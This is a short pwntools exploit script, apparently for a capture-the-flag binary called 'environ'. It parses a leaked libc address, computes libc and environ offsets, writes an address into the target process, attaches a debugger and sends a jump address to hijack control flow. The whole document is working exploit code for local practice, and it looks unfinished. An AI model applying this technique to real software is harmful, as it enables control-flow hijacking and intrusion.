#!/usr/bin/python 
from pwn import *

context.arch = 'x86_64'
context.log_level = 'debug'
p = process("./environ")
elf = ELF("./environ")
libc = elf.libc 

p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
libcBase = stdout - 0x3c5620
libc_environ = libcBase + 0x3c6f38
log.info("stdout : "+hex(stdout))
log.info("libcBase : "+hex(libcBase))
log.info("libc_environ : "+hex(libc_environ))
p.sendlineafter("Size: ", str(len(p64(0x601080))))
p.sendafter("Data: ", p64(0x601080))
libc_start = libcBase - 0x39f8c0

gdb.attach(p)
p.sendlineafter("*jmp=", str(0x601040))

p.interactive()
